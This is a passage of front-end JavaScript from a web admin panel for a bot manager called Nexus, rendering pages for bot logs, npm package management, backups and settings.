              <div class="err-line">${esc(t('errors.tokenInvalidHint'))}</div>
              <div class="flex gap-6 mt-8">
                <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(b.name)}'})"><i class="ti ti-code"></i> ${esc(t('actionTitle.open'))}</button>
                <button class="btn btn-primary btn-sm" onclick="botAction('restart','${escJs(b.name)}',this)"><i class="ti ti-refresh"></i> ${esc(t('actionTitle.restart'))}</button>
              </div>
            </div>`).join('')}
        </div>` : ''}


      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="ti ti-terminal"></i> ${esc(t('logs.title'))} — <span id="log-bot-nm">${esc(first || '—')}</span></span>
          <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('log-out','log-err',this)">${esc(t('logs.stdoutTab'))}</button>
            <button class="tab-btn" onclick="switchTab('log-err','log-out',this)">${esc(t('logs.stderrTab'))}</button>
          </div>
        </div>
        <div id="log-out" style="background:var(--bg-base);border-radius:0 0 10px 10px;min-height:350px;max-height:450px;overflow-y:auto;padding:4px 0;"></div>
        <div id="log-err" style="background:var(--bg-base);border-radius:0 0 10px 10px;min-height:350px;max-height:450px;overflow-y:auto;padding:4px 0;display:none;"></div>
      </div>`;

    if (first) switchLogBot(first);
  } catch (e) {
    page.innerHTML = `
      <div class="section-title mb-16"><i class="ti ti-terminal"></i> ${esc(t('logs.title'))}</div>
      <div class="card">
        <div class="empty-state" style="padding:32px 24px;">
          <i class="ti ti-alert-circle" style="font-size:40px;color:var(--red);"></i>
          <div class="empty-state-title">${esc(t('empty.logsErrorTitle'))}</div>
          <div class="empty-state-desc">${esc(e.message || t('empty.logsErrorDesc'))}</div>
          <button class="btn btn-primary mt-16" onclick="loadLogs()"><i class="ti ti-refresh"></i> ${esc(t('logs.retry'))}</button>
        </div>
      </div>`;
  }
}

async function switchLogBot(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  App.currentLogBot = botName;
  const nm = document.getElementById('log-bot-nm'); if (nm) nm.textContent = botName;
  const outEl = document.getElementById('log-out');
  const errEl = document.getElementById('log-err');
  if (outEl) outEl.innerHTML = `<div class="loader" style="background:transparent;padding:20px;"><div class="spinner"></div></div>`;
  if (errEl) errEl.innerHTML = '';

  try {
    const logs = await NexusAPI.bots.logs(botName, 200);
    if (outEl) {
      outEl.innerHTML = logs.out.length
        ? logs.out.map(l => logLine(l)).join('')
        : `<div class="log-empty"><i class="ti ti-info-circle"></i> ${esc(t('logs.emptyStdout'))}</div>`;
      outEl.scrollTop = outEl.scrollHeight;
    }
    if (errEl) {
      if (logs.err.length) {
        const rendered = logs.err.map(l => `<div class="log-line"><span class="log-err">${esc(window.NexusDiagnostics ? NexusDiagnostics.sanitize(l) : l)}</span></div>`).join('');
        const diag = window.NexusDiagnostics ? NexusDiagnostics.renderHTML(logs.err) : '';
        errEl.innerHTML = diag + rendered;
      } else {
        errEl.innerHTML = `<div class="log-empty"><i class="ti ti-info-circle"></i> ${esc(t('logs.emptyStderr'))}</div>`;
      }
    }

    // Subscribe live
    if (App.socket) {
      App.socket.emit('subscribe:logs', botName);
      App.socket.off('log:out'); App.socket.off('log:err');
      App.socket.on('log:out', d => {
        if (d.bot === botName && outEl) {
          outEl.insertAdjacentHTML('beforeend', `<div class="log-line"><span class="log-ts">${new Date(d.ts).toLocaleTimeString()}</span><span class="log-out">${esc(d.line)}</span></div>`);
          outEl.scrollTop = outEl.scrollHeight;
        }
      });
      App.socket.on('log:err', d => {
        if (d.bot === botName && errEl) {
          const safeLine = window.NexusDiagnostics ? NexusDiagnostics.sanitize(d.line) : d.line;
          errEl.insertAdjacentHTML('beforeend', `<div class="log-line"><span class="log-ts">${new Date(d.ts).toLocaleTimeString()}</span><span class="log-err">${esc(safeLine)}</span></div>`);
        }
      });
    }
  } catch (e) {
    const msg = (e && e.message) || t('errors.genericDesc');
    if (outEl) outEl.innerHTML = `<div class="log-empty" style="color:var(--red);"><i class="ti ti-alert-circle"></i> ${esc(msg)}</div>`;
  }
}

function clearLogs() {
  const o = document.getElementById('log-out'); if (o) o.innerHTML = '';
  const e = document.getElementById('log-err'); if (e) e.innerHTML = '';
}

function exportLogs() {
  const txt = document.getElementById('log-out')?.innerText || '';
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([txt], { type: 'text/plain' }));
  a.download = `${App.currentLogBot || 'nexus'}-logs-${new Date().toISOString().slice(0,10)}.txt`;
  a.click();
}

// ------------------------------------------------------------
// NPM PAGE
// ------------------------------------------------------------
async function loadNpm(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-npm');
  try {
    const bots  = App.bots.length ? App.bots : await NexusAPI.bots.list();
    App.bots    = bots;
    const first = botName || bots[0]?.name;

    // Empty state: no bot exists yet — show a clear CTA to create one
    if (!bots.length) {
      page.innerHTML = `
        <div class="section-title mb-16"><i class="ti ti-package"></i> ${esc(t('npm.title'))}</div>
        <div class="card">
          <div class="empty-state" style="padding:48px 24px;">
            <i class="ti ti-robot" style="font-size:48px;color:var(--tx-3);"></i>
            <div class="empty-state-title">${esc(t('npm.noBotsTitle'))}</div>
            <div class="empty-state-desc">${esc(t('npm.noBotsDesc'))}</div>
            <div style="margin-top:16px;">
              <button class="btn btn-primary" onclick="navigate('new-bot')"><i class="ti ti-plus"></i> ${esc(t('common.newBot'))}</button>
            </div>
          </div>
        </div>`;
      return;
    }

    page.innerHTML = `
      <div class="flex-between mb-16">
        <span class="section-title"><i class="ti ti-package"></i> ${esc(t('npm.title'))}</span>
        <div class="flex gap-8">
          <select class="form-control" id="npm-sel" style="width:200px;" onchange="loadNpmForBot(this.value)">
            ${bots.map(b => `<option value="${esc(b.name)}"${b.name===first?' selected':''}>${esc(b.display_name || b.name)}</option>`).join('')}
          </select>
          <button class="btn btn-primary btn-sm" onclick="showInstallModal()"><i class="ti ti-plus"></i> ${esc(t('npm.installBtn'))}</button>
        </div>
      </div>
      <div id="npm-content"><div class="loader"><div class="spinner spinner-lg"></div></div></div>`;

    if (first) loadNpmForBot(first);
  } catch (e) {
    page.innerHTML = `
      <div class="section-title mb-16"><i class="ti ti-package"></i> ${esc(t('npm.title'))}</div>
      <div class="card">
        <div class="empty-state" style="padding:32px 24px;">
          <i class="ti ti-alert-circle" style="font-size:40px;color:var(--red);"></i>
          <div class="empty-state-title">${esc(t('npm.errorTitle'))}</div>
          <div class="empty-state-desc">${esc(e.message || t('npm.errorDesc'))}</div>
          <button class="btn btn-primary mt-16" onclick="loadNpm()"><i class="ti ti-refresh"></i> ${esc(t('npm.retry'))}</button>
        </div>
      </div>`;
  }
}

async function loadNpmForBot(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const el = document.getElementById('npm-content');
  if (!el) return;
  el.innerHTML = `<div class="loader" style="padding:20px;"><div class="spinner"></div></div>`;

  try {
    const deps = await NexusAPI.bots.npmList(botName);
    const depsMap = deps.dependencies || {};
    const count = Object.keys(depsMap).length;
    const rows = Object.entries(depsMap).map(([k,v]) => `
      <div style="display:flex;align-items:center;gap:8px;padding:9px 16px;border-bottom:1px solid var(--border);">
        <i class="ti ti-package" style="color:var(--blue);font-size:14px;"></i>
        <span style="font-weight:500;color:var(--tx-1);flex:1;">${esc(k)}</span>
        <span style="font-family:var(--font-mono);font-size:11px;color:var(--tx-3);">${esc(v)}</span>
        <span class="badge badge-blue" style="font-size:9px;">${esc(t('npm.installed'))}</span>
        <button class="btn btn-danger btn-xs" onclick="removePkg('${escJs(botName)}','${escJs(k)}')" title="${esc(t('npm.removeBtn'))}"><i class="ti ti-trash"></i></button>
      </div>`).join('');

    const emptyOrRows = count ? rows : `
      <div class="empty-state" style="padding:48px 24px;">
        <i class="ti ti-package" style="font-size:40px;color:var(--tx-3);"></i>
        <div class="empty-state-title">${esc(t('npm.emptyNoPkgTitle'))}</div>
        <div class="empty-state-desc">${esc(t('npm.emptyNoPkgDesc'))}</div>
        <div style="margin-top:14px;">
          <button class="btn btn-primary btn-sm" onclick="showInstallModal()"><i class="ti ti-plus"></i> ${esc(t('npm.emptyNoPkgCta'))}</button>
        </div>
      </div>`;

    el.innerHTML = `<div class="card">
      <div class="card-header"><span class="card-title"><i class="ti ti-package"></i> ${esc(t('npm.title'))} - ${esc(botName)}</span>
        <div class="flex gap-8" style="align-items:center;">
          <span style="font-size:11px;color:var(--tx-3);">${esc(t('npm.metaCount', { n: count }))}</span>
          <button class="btn btn-ghost btn-xs" onclick="reinstallDeps('${escJs(botName)}')"><i class="ti ti-refresh"></i>${esc(t('npm.reinstall'))}</button>
        </div>
      </div>
      ${emptyOrRows}
    </div>`;
  } catch (e) {
    el.innerHTML = `
      <div class="empty-state" style="padding:32px 24px;">
        <i class="ti ti-alert-circle" style="font-size:40px;color:var(--red);"></i>
        <div class="empty-state-title">${esc(t('npm.errorTitle'))}</div>
        <div class="empty-state-desc">${esc(e.message || t('npm.errorDesc'))}</div>
        <button class="btn btn-primary mt-16" onclick="loadNpmForBot('${escJs(botName)}')"><i class="ti ti-refresh"></i> ${esc(t('npm.retry'))}</button>
      </div>`;
  }
}

function showInstallModal() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const botName = document.getElementById('npm-sel')?.value;
  if (!botName) return;
  const ov = document.createElement('div');
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal modal-sm">
    <div class="modal-header"><span class="modal-title"><i class="ti ti-package"></i> ${esc(t('npm.installTitle'))}</span>
      <button class="btn-close" onclick="this.closest('.modal-overlay').remove()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group"><label class="form-label">${esc(t('npm.installNameLabel'))}</label>
        <input class="form-control" id="inst-pkg" placeholder="${esc(t('npm.installNamePh'))}" autofocus/>
        <div class="form-hint"><i class="ti ti-info-circle"></i> ${esc(t('npm.installNamePh'))}</div>
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="this.closest('.modal-overlay').remove()">${esc(t('common.cancel'))}</button>
      <button class="btn btn-primary" onclick="installPkg('${escJs(botName)}')"><i class="ti ti-download"></i> ${esc(t('npm.installBtn'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.querySelector('#inst-pkg').focus();
  ov.onclick = e => { if (e.target === ov) ov.remove(); };
}

async function installPkg(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const pkgs = (document.getElementById('inst-pkg')?.value || '').trim().split(/\s+/).filter(Boolean);
  if (!pkgs.length) return;
  document.querySelector('.modal-overlay')?.remove();
  toast('info', t('npm.installing'), pkgs.join(', '));
  try {
    await NexusAPI.bots.npmInstall(botName, pkgs, false);
    toast('success', t('npm.installed'), pkgs.join(', '));
    loadNpmForBot(botName);
  } catch (e) { toast('error', t('errors.generic'), (e && e.message) || t('errors.genericDesc')); }
}

async function reinstallDeps(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(t('npm.reinstallConfirm'), t('npm.reinstallConfirmDesc', { bot: botName }), async () => {
    try {
      await NexusAPI.bots.npmReinstall(botName);
      toast('success', t('npm.reinstalled'), t('npm.reinstalledDesc'));
      loadNpmForBot(botName);
    } catch (e) {
      toast('error', t('npm.reinstallFailed'), e.message);
    }
  }, false);
}

async function removePkg(botName, pkg) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(t('npm.uninstallConfirm'), t('npm.uninstallConfirmDesc', { pkg, bot: botName }), async () => {
    try {
      await NexusAPI.bots.npmRemove(botName, pkg);
      toast('success', t('npm.uninstalled'), pkg);
      loadNpmForBot(botName);
    } catch (e) {
      toast('error', t('errors.generic'), (e && e.message) || t('errors.genericDesc'));
    }
  });
}

// ------------------------------------------------------------
// BACKUPS PAGE
// ------------------------------------------------------------
async function loadBackups() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-backups');
  try {
    const [bots, backups] = await Promise.all([NexusAPI.bots.list(), NexusAPI.backups.list()]);
    App.bots = bots;

    page.innerHTML = `
      <div class="flex-between mb-16">
        <span class="section-title"><i class="ti ti-archive"></i>${esc(_t('backupsPage.title'))}</span>
        <button class="btn btn-ghost btn-sm" onclick="showImportModal()"><i class="ti ti-upload"></i>${esc(_t('backupsPage.import'))}</button>
      </div>

      <div class="card mb-16">
        <div class="card-header"><span class="card-title"><i class="ti ti-download"></i>${esc(_t('backupsPage.exportBot'))}</span></div>
        <div class="card-body">
          <div class="flex gap-8">
            <select class="form-control" id="exp-sel" style="flex:1;">
              ${bots.map(b => `<option value="${esc(b.name)}">${esc(b.name)}</option>`).join('')}
            </select>
            <button class="btn btn-primary" onclick="exportBot(document.getElementById('exp-sel').value)"><i class="ti ti-archive"></i>${esc(_t('backupsPage.downloadZip'))}</button>
          </div>
          <div class="form-hint mt-8"><i class="ti ti-info-circle"></i>${esc(_t('backupsPage.hint'))}</div>
        </div>
      </div>

      <div class="drop-zone mb-16" id="bk-dz" onclick="showImportModal()">
        <i class="ti ti-upload"></i>
        ${_t('backupsPage.dropZone')}
      </div>

      <div class="table-wrap">
        <div class="table-toolbar"><span class="table-title"><i class="ti ti-history"></i>${esc(_t('backupsPage.exportHistory'))}</span></div>
        ${backups.length ? `<table class="data-tbl">
          <thead><tr><th>${esc(_t('backupsPage.colBot'))}</th><th>${esc(_t('backupsPage.colFile'))}</th><th>${esc(_t('backupsPage.colDate'))}</th><th></th></tr></thead>
          <tbody>${backups.map(b => `<tr>
            <td class="td-bold">${esc(b.bot_name)}</td>
            <td class="td-mono">${esc(b.filename)}</td>
            <td style="color:var(--tx-3);font-size:12px;">${fmtDate(b.created_at)}</td>
            <td><div class="act-group"><button class="act-btn act-danger" onclick="delBackup(${b.id})"><i class="ti ti-trash"></i></button></div></td>
          </tr>`).join('')}</tbody>
        </table>` : `<div class="empty-state"><i class="ti ti-archive"></i><div class="empty-state-title">${esc(_t('backupsPage.noBackups'))}</div></div>`}
      </div>`;

    const dz = document.getElementById('bk-dz');
    if (dz) {
      dz.ondragover = e => { e.preventDefault(); dz.classList.add('drag-over'); };
      dz.ondragleave = () => dz.classList.remove('drag-over');
      dz.ondrop = async e => { e.preventDefault(); dz.classList.remove('drag-over'); if (e.dataTransfer.files[0]) await importArchive(e.dataTransfer.files[0]); };
    }
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

async function exportBot(name) {
  if (!name) return;
  toast('info', t('toasts.exportInProgress'), name);
  try {
    const res = await NexusAPI.backups.export(name);
    if (!res.ok) throw new Error((await res.json()).error);
    const blob = await res.blob();
    const cd   = res.headers.get('content-disposition') || '';
    const fn   = cd.match(/filename="([^"]+)"/)?.[1] || `${name}-backup.zip`;
    const a    = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = fn; a.click();
    URL.revokeObjectURL(a.href);
    toast('success', t('toasts.exportOk'), fn);
    loadBackups();
  } catch (e) { toast('error', t('toasts.exportError'), e.message); }
}

function showImportModal() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const ov = document.createElement('div');
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal modal-sm">
    <div class="modal-header"><span class="modal-title"><i class="ti ti-upload"></i>${esc(_t('backupsPage.importTitle'))}</span>
      <button class="btn-close" onclick="this.closest('.modal-overlay').remove()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <div class="drop-zone" onclick="document.getElementById('imp-f').click()" style="margin-bottom:8px;">
        <i class="ti ti-file-zip"></i>${esc(_t('backupsPage.dropZoneModal'))}
      </div>
      <input type="file" id="imp-f" accept=".zip" style="display:none;" onchange="importArchive(this.files[0])"/>
    </div>
    <div class="modal-footer"><button class="btn btn-ghost" onclick="this.closest('.modal-overlay').remove()">${esc(_t('backupsPage.close'))}</button></div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) ov.remove(); };
}

async function importArchive(file) {
  document.querySelector('.modal-overlay')?.remove();
  toast('info', t('toasts.importInProgress'), file.name);
  try {
    const r = await NexusAPI.backups.import(file);
    toast('success', t('toasts.importOk'), r.name);
    if (App.currentPage === 'backups') loadBackups();
  } catch (e) { toast('error', t('toasts.importError'), e.message); }
}

async function delBackup(id) {
  try { await NexusAPI.backups.delete(id); loadBackups(); }
  catch (e) { toast('error', t('toasts.error'), e.message); }
}

// ------------------------------------------------------------
// SETTINGS PAGE
// ------------------------------------------------------------
async function loadSettings(focusSection = null) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (!focusSection) focusSection = App.currentSettingsSection || 'general';
  markSettingsClean();
  const page = document.getElementById('page-settings');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  try {
    const settings = await NexusAPI.system.settings();
    App.settings = settings;

    page.innerHTML = `
      <div class="section-title mb-16"><i class="ti ti-settings"></i>${esc(_t('settingsPage.title'))} <span id="settings-dirty-badge" class="badge badge-amber" style="display:none;margin-left:8px;">${esc(_t('settingsPage.unsavedBadge'))}</span></div>
      <div class="settings-layout">
        <div class="settings-nav">
          ${[
            ['general',   'ti-adjustments', _t('settingsPage.navGeneral')],
            ['account',   'ti-user',        _t('settingsPage.navAccount')],
            ['appearance','ti-palette',     _t('settingsPage.navAppearance')],
            ['language',  'ti-language',    _t('settingsPage.navLanguage')],
            ['bots-cfg',  'ti-robot',       _t('settingsPage.navBots')],
            ['users',     'ti-users',       _t('settingsPage.navUsers')],
            ['webhooks',  'ti-webhook',     _t('settingsPage.navWebhooks')],
            ['export',    'ti-download',    _t('settingsPage.navExport')],
            ['mcp',       'ti-plug-connected', _t('settingsPage.navMcp')],
            ['software',  'ti-package',     _t('settingsPage.navSoftware')],
            ['about',     'ti-info-circle', _t('settingsPage.navAbout')]
          ].map(([id,ic,lbl]) =>
            `<div class="settings-nav-item${id==='general'?' active':''}" data-section="${id}" onclick="showSettingsSection('${id}',this)"><i class="ti ${ic}"></i>${esc(lbl)}</div>`
          ).join('')}
        </div>

        <div>
          <!-- General -->
          <div class="settings-section active" id="section-general">
            <div class="card mb-16">
              <div class="card-header"><span class="card-title"><i class="ti ti-adjustments"></i>${esc(_t('settingsPage.generalCard'))}</span></div>
              <div class="card-body">
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.instanceName'))}</label>
                  <input class="form-control" id="s-name" value="${esc(settings.instance_name || 'Nexus Bot Manager')}"/>
                  <div class="form-hint">${esc(_t('settingsPage.instanceHint'))}</div>
                </div>
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.botsRoot'))}</label>
                  <input class="form-control mono" value="${esc(settings.bots_root || '/opt')}" disabled/>
                  <div class="form-hint">${esc(_t('settingsPage.botsRootHint'))}</div>
                </div>
              </div>
              <div class="card-footer"><button class="btn btn-primary" onclick="saveGeneralSettings()"><i class="ti ti-check"></i>${esc(_t('common.save'))}</button></div>
            </div>

            <div class="card">
              <div class="card-header"><span class="card-title"><i class="ti ti-robot"></i>${esc(_t('settingsPage.botsBehaviour'))}</span></div>
              <div class="card-body">
                <div class="form-group">
                  <label class="toggle"><input type="checkbox" id="s-autorestart" ${settings.bot_autorestart ? 'checked' : ''}/>
                    <span class="toggle-label">${esc(_t('settingsPage.autorestart'))}</span>
                  </label>
                </div>
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.maxRestarts'))} <span class="form-label-hint">${esc(_t('settingsPage.beforeAbandon'))}</span></label>
                  <input class="form-control" id="s-maxrestart" type="number" value="${settings.bot_max_restarts || 5}" min="1" max="20" style="width:100px;"/>
                </div>
              </div>
              <div class="card-footer"><button class="btn btn-primary" onclick="saveBotSettings()"><i class="ti ti-check"></i>${esc(_t('common.save'))}</button></div>
            </div>
          </div>

          <!-- Account -->
          <div class="settings-section" id="section-account">
            <div class="card mb-16">
              <div class="card-header"><span class="card-title"><i class="ti ti-user-circle"></i>${esc(_t('profile.title'))}</span></div>
              <div class="card-body" style="display:flex;align-items:center;gap:14px;flex-wrap:wrap;">
                <div class="profile-avatar-lg" id="account-profile-avatar">${(currentUser()?.avatar) ? avatarImageHtml(currentUser().avatar, '') : esc(botInitials(currentUser()?.display_name || currentUser()?.username || 'A'))}</div>
                <div style="flex:1;min-width:160px;">
                  <div id="account-profile-name" style="font-weight:600;color:var(--tx-1);">${esc(currentUser()?.display_name || currentUser()?.username || '')}</div>
                  <div id="account-profile-username" class="form-hint">@${esc(currentUser()?.username || '')}</div>
                </div>
                <button class="btn btn-ghost" type="button" onclick="showProfileModal()"><i class="ti ti-edit"></i>${esc(_t('profile.edit'))}</button>
              </div>
            </div>
            <div class="card">
              <div class="card-header"><span class="card-title"><i class="ti ti-lock"></i>${esc(_t('settingsPage.changePassword'))}</span></div>
              <div class="card-body">
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.currentPwd'))}</label><input class="form-control" type="password" id="s-curpwd"/></div>
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.newPwd'))}</label><input class="form-control" type="password" id="s-newpwd" maxlength="72"/></div>
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.confirmPwd'))}</label><input class="form-control" type="password" id="s-cfpwd" maxlength="72"/></div>
              </div>
              <div class="card-footer"><button class="btn btn-primary" onclick="changePassword()"><i class="ti ti-key"></i>${esc(_t('settingsPage.change'))}</button></div>
            </div>
          </div>

          <!-- Appearance -->
          <div class="settings-section" id="section-appearance">
            ${window.NexusTheme ? window.NexusTheme.renderSettings() : ''}
          </div>

          <!-- Language -->
          <div class="settings-section" id="section-language">
            <div class="card">
              <div class="card-header"><span class="card-title"><i class="ti ti-language"></i>${esc(_t('settingsPage.navLanguage'))}</span></div>
              <div class="card-body">
                <p style="font-size:12px;color:var(--tx-3);margin-bottom:14px;">${esc(_t('settingsPage.languageDesc'))}</p>
                <div class="lang-picker" id="settings-lang-picker">
                  ${window.NexusI18n ? window.NexusI18n.SUPPORTED.map(code => `
                    <button type="button" class="lang-pick${NexusI18n.current()===code?' active':''}" data-lang="${code}">
                      <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
                      <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
                    </button>`).join('') : ''}
                </div>
              </div>
            </div>
          </div>

          <!-- Bots config -->
          <div class="settings-section" id="section-bots-cfg">
            <div class="card">
              <div class="card-header"><span class="card-title"><i class="ti ti-robot"></i>${esc(_t('settingsPage.advancedBots'))}</span></div>
              <div class="card-body">
                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.monitoringInterval'))} <span class="form-label-hint">${esc(_t('settingsPage.seconds'))}</span></label>
                  <input class="form-control" id="s-monint" type="number" value="${settings.monitoring_interval || 5}" min="2" max="60" style="width:100px;"/>
                </div>
                <div class="form-group">
                  <label class="toggle"><input type="checkbox" id="s-notif" ${settings.notifications_enabled ? 'checked' : ''}/>
                    <span class="toggle-label">${esc(_t('settingsPage.notificationsEnabled'))}</span>
                  </label>
                </div>
              </div>
              <div class="card-footer"><button class="btn btn-primary" onclick="saveAdvancedSettings()"><i class="ti ti-check"></i>${esc(_t('common.save'))}</button></div>
            </div>
          </div>

          <!-- Users -->
          <div class="settings-section" id="section-users">
            <div id="users-panel"><div class="loader"><div class="spinner spinner-lg"></div></div></div>
          </div>

          <!-- Webhooks -->
          <div class="settings-section" id="section-webhooks">
            <div id="webhooks-panel"><div class="loader"><div class="spinner spinner-lg"></div></div></div>
          </div>

          <!-- Export -->
          <div class="settings-section" id="section-export">
            <div class="card mb-16">
              <div class="card-header"><span class="card-title"><i class="ti ti-file-code"></i>${esc(_t('exportSettings.title'))}</span></div>
              <div class="card-body">
                <p class="form-hint" style="margin-bottom:12px;">${esc(_t('exportSettings.settingsHint'))}</p>
                <button class="btn btn-ghost" onclick="downloadPanelExport('settings')"><i class="ti ti-download"></i>${esc(_t('exportSettings.settingsButton'))}</button>
              </div>
            </div>
            <div class="card" style="border-color:var(--amber-b);">
              <div class="card-header"><span class="card-title" style="color:var(--amber);"><i class="ti ti-alert-triangle"></i>${esc(_t('exportSettings.fullTitle'))}</span></div>
              <div class="card-body">
                <p style="font-size:12px;color:var(--tx-2);line-height:1.6;margin-bottom:12px;">${esc(_t('exportSettings.fullHint'))}</p>
                <button class="btn btn-danger" onclick="confirmFullExport()"><i class="ti ti-archive"></i>${esc(_t('exportSettings.fullButton'))}</button>
              </div>
            </div>
            <div class="card mb-16">
              <div class="card-header"><span class="card-title"><i class="ti ti-upload"></i>${esc(_t('exportSettings.importSettingsTitle'))}</span></div>
              <div class="card-body">
                <p class="form-hint" style="margin-bottom:12px;">${esc(_t('exportSettings.importSettingsHint'))}</p>
                <input type="file" id="settings-import-file" accept=".json,application/json" style="display:none" onchange="importSettingsFile(this)"/>
                <button class="btn btn-ghost" onclick="document.getElementById('settings-import-file').click()"><i class="ti ti-file-import"></i>${esc(_t('exportSettings.importSettingsButton'))}</button>
              </div>
            </div>
            <div class="card" style="border-color:var(--red-b);">
              <div class="card-header"><span class="card-title" style="color:var(--red);"><i class="ti ti-alert-octagon"></i>${esc(_t('exportSettings.importFullTitle'))}</span></div>
              <div class="card-body">
                <p style="font-size:12px;color:var(--tx-2);line-height:1.6;margin-bottom:12px;">${esc(_t('exportSettings.importFullHint'))}</p>
                <input type="file" id="full-import-file" accept=".zip,application/zip" style="display:none" onchange="confirmFullImport(this)"/>
                <button class="btn btn-danger" onclick="document.getElementById('full-import-file').click()"><i class="ti ti-upload"></i>${esc(_t('exportSettings.importFullButton'))}</button>
              </div>
            </div>
          </div>

          <!-- MCP -->
          <div class="settings-section" id="section-mcp">
            <div id="mcp-panel"></div>
          </div>

          <!-- Software / Updates -->
          <div class="settings-section" id="section-software">
            <div id="software-panel"></div>
          </div>

          <!-- About -->
          <div class="settings-section" id="section-about">
            <!-- Présentation -->
            <div class="card" style="margin-bottom:16px;">
              <div class="card-header"><span class="card-title"><i class="ti ti-info-circle"></i>${esc(_t('settingsPage.about'))}</span></div>
              <div class="card-body">
                <p style="font-size:13px;color:var(--tx-2);line-height:1.6;margin-bottom:14px;">
                  ${_t('settingsPage.aboutDesc')}
                </p>
                <p style="font-size:12px;color:var(--tx-3);line-height:1.6;">
                  ${_t('settingsPage.aboutDesc2')}
                </p>
              </div>
            </div>

            <!-- Liens officiels -->
            <div class="card" style="margin-bottom:16px;">
              <div class="card-header"><span class="card-title"><i class="ti ti-link"></i>${esc(_t('settingsPage.officialLinks'))}</span></div>
              <div class="card-body" style="padding:0;">
                <a href="https://nexus.dj-julien.fr/" target="_blank" rel="noopener" class="link-row">
                  <i class="ti ti-world" style="color:var(--blue);"></i>
                  <div class="link-row-text"><strong>${esc(_t('settingsPage.officialSite'))}</strong><span>${esc(_t('settingsPage.officialSiteDesc'))}</span></div>
                  <i class="ti ti-external-link link-row-arrow"></i>
                </a>
                <a href="https://nexus.dj-julien.fr/docs.html" target="_blank" rel="noopener" class="link-row">
                  <i class="ti ti-book" style="color:var(--green);"></i>
                  <div class="link-row-text"><strong>${esc(_t('settingsPage.documentation'))}</strong><span>${esc(_t('settingsPage.documentationDesc'))}</span></div>
                  <i class="ti ti-external-link link-row-arrow"></i>
                </a>
                <a href="https://nexus.dj-julien.fr/changelog.html" target="_blank" rel="noopener" class="link-row">
                  <i class="ti ti-history" style="color:var(--amber);"></i>
                  <div class="link-row-text"><strong>${esc(_t('settingsPage.changelog'))}</strong><span>${esc(_t('settingsPage.changelogDesc'))}</span></div>
                  <i class="ti ti-external-link link-row-arrow"></i>
                </a>
                <a href="https://github.com/Julien48003/nexus-bot-manager" target="_blank" rel="noopener" class="link-row">
                  <i class="ti ti-brand-github" style="color:var(--tx-1);"></i>
                  <div class="link-row-text"><strong>${esc(_t('settingsPage.github'))}</strong><span>${esc(_t('settingsPage.githubDesc'))}</span></div>
                  <i class="ti ti-external-link link-row-arrow"></i>
                </a>
              </div>
            </div>

            <!-- Informations système -->
            <div class="card" style="margin-bottom:16px;">
              <div class="card-header"><span class="card-title"><i class="ti ti-server"></i>${esc(_t('settingsPage.systemInfo'))}</span></div>
              <div class="card-body">
                <div class="metric-row"><span class="metric-key">${esc(_t('settingsPage.nexusVersion'))}</span><span class="metric-val" id="about-version">—</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('settingsPage.stack'))}</span><span class="metric-val">${esc(_t('settingsPage.stackVal'))}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.nodejs'))}</span><span class="metric-val">${esc(App.systemInfo?.versions?.node || '—')}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.npmVer'))}</span><span class="metric-val">${esc(App.systemInfo?.versions?.npm || '—')}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.pm2Ver'))}</span><span class="metric-val">${esc(App.systemInfo?.versions?.pm2 || '—')}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.os'))}</span><span class="metric-val">${esc(App.systemInfo?.os?.distro || '—')} ${esc(App.systemInfo?.os?.release || '')}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.hostname'))}</span><span class="metric-val">${esc(App.systemInfo?.os?.hostname || '—')}</span></div>
                <div class="metric-row"><span class="metric-key">${esc(_t('settingsPage.botsStorage'))}</span><span class="metric-val">${esc((App.systemInfo?.disk?.mount || '/opt') + ' · ' + (App.systemInfo?.disk?.used || 0) + ' / ' + (App.systemInfo?.disk?.total || 0) + ' Go')}</span></div>
              </div>
            </div>
          </div>

        </div>
      </div>`;
